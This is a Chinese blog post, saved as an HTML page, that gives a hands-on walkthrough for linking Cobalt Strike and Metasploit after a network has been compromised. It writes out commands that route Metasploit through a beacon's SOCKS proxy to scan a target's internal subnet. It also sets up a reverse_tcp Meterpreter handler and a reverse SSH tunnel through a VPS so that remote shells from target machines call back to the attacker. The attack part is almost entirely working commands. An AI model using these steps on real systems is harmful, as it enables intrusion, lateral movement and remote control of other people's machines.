<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> CobaltStrike+MetaSploit 实战联动 · Uknow - Stay hungry Stay foolish</title><meta name="description" content="CobaltStrike+MetaSploit 实战联动 - uknow"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/2.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" type="text/css"></head><body><div id="mask" style="display: none;"><img id="mask-image" src="#" style=" "></div><div class="wrap"><header><a href="/" class="logo-link"><img src="/2.png"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">Blog</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">Archive</a></li><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">About</a></li><li class="nav-list-item"><a href="https://github.com/uknowsec" target="_blank" class="nav-list-link">GitHub</a></li><li class="nav-list-item"><a href="http://weibo.com/uknowsec" target="_blank" class="nav-list-link">Weibo</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">CobaltStrike+MetaSploit 实战联动</h1><div class="post-time">Aug 19, 2019</div><div class="post-content"><h4><span id="通过beacon内置的socks功能将本地msf直接代入目标内网进行操作"><strong><strong>通过beacon内置的socks功能将本地Msf直接代入目标内网进行操作</strong></strong></span></h4><p>首先,到已控目标内网机器的beacon shell下把socks起起来</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; getuid</span><br><span class="line">beacon&gt; socks 1080</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566202123619.png" alt="1566202123619"></p>
<p>接着，点开cs菜单找到 “Proxy Pivots” 复制生成的msf代理链接</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566202164641.png" alt="1566202164641"></p>
<p> 本地启动msf，挂着上面生成的代理链接，即可直接对目标内网进行各种探测</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">msf &gt; setg Proxies socks4:172.16.252.11:1080    意思就是让本地的msf走上面cs的socks代理</span><br><span class="line">msf &gt; setg ReverseAllowProxy true              建双向通道</span><br><span class="line">msf &gt; use auxiliary/scanner/smb/smb_version    拿着msf中的各类探测模块对目标内网进行正常探测即可,比如,识别目标内网所有windows机器的详细系统版本,机器名和所在域</span><br><span class="line">msf &gt; set rhosts 172.17.180.0/24               指定CIDR格式的目标内网段,掩码可根据实际情况给的大一点,比如,0/20,0/16...</span><br><span class="line">msf &gt; set threads 1                            线程不易给的太大,可根据目标实际情况,控制在10以内</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566203284050.png" alt="1566203284050"></p>
<h4><span id="尝试借助cobaltstrike的外部tcp监听器通过ssh隧道直接派生一个meterpreter-的-shell-到本地"><strong>尝试借助CobaltStrike的外部tcp监听器通过ssh隧道直接派生一个meterpreter 的 shell 到本地</strong></span></h4><p>先在cs上创建一个tcp的外部监听器，回连端口设为8080</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566219775310.png" alt="1566219775310"></p>
<p>接着，到本地机器把msf起起来，并创建如下监听器</p>
   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf &gt; set payload windows/meterpreter/reverse_tcp   注:此处的协议格式务必要和上面cs外部监听器的协议对应,不然meter是无法正常回连的</span><br><span class="line">msf &gt; set lhost 192.168.0.109</span><br><span class="line">msf &gt; set lport 8080</span><br><span class="line">msf &gt; exploit</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566219843294.png" alt="1566219843294"></p>
<p>随后，回到自己的vps机器上编辑sshd配置，开启ssh转发功能，重启ssh服务。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># vi/etc/ssh/sshd_config</span><br><span class="line">  AllowTcpForwarding yes</span><br><span class="line">  GatewayPorts yes</span><br><span class="line">  TCPKeepAlive yes</span><br><span class="line">  PasswordAuthentication yes</span><br><span class="line"># systemctl restartsshd.service</span><br></pre></td></tr></table></figure>
<p>再次回到自己本地的linux中并通过ssh隧道做好如下转发，意思就是通过1.1.1.1 这台机器把来自外部的8080端口流量全部转到我本地192.168.3.137的8080端口上，而本地192.168.0.109的8080端口上跑的又正好是meter的监听器，所以，最终才会造成meterpreter本地上线的效果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># ssh -C -f -N -g -R 0.0.0.0:8080:192.168.0.109:8080 root@1.1.1.1 -p 22</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566220724560.png" alt="1566220724560"></p>
<p> 隧道建立之后，习惯性的到vps上去看一眼，刚才通过隧道监听的8080端口到底有没有起来，确实起起来了才说明隧道才是通的，另外，监听的端口不能和vps机器上的现有端口冲突，否则隧道是建不成功的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># netstat -tulnp |grep &apos;8080&apos;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566220672720.png" alt="1566220672720"></p>
<p>  最终，回到cs上选择目标内网指定机器的beacon shell 点击 “Spawn” 派生，再选择刚在上面创建好的tcp的外部监听器，相应目标机器的meterpreter就会被直接弹到本地，如下，当然，你也可以批量选择进行操作</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566220789339.png" alt="1566220789339"></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566220870785.png" alt="1566220870785"></p>
</div></article></div></section><footer><div class="paginator"><a href="/posts/notes/域渗透-Kerberos.html" class="prev">PREV</a><a href="/posts/notes/shellcode加载总结.html" class="next">NEXT</a></div><div class="copyright"><p>© 2016 - 2019 <a href="https://uknowsec.cn">uknow</a>  Stay hungry,Stay foolish.</p></div></footer></div><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-115504647-1",'auto');ga('send','pageview');</script><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?225ebcce29d319519ac7c7690425d1d4";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script></body></html>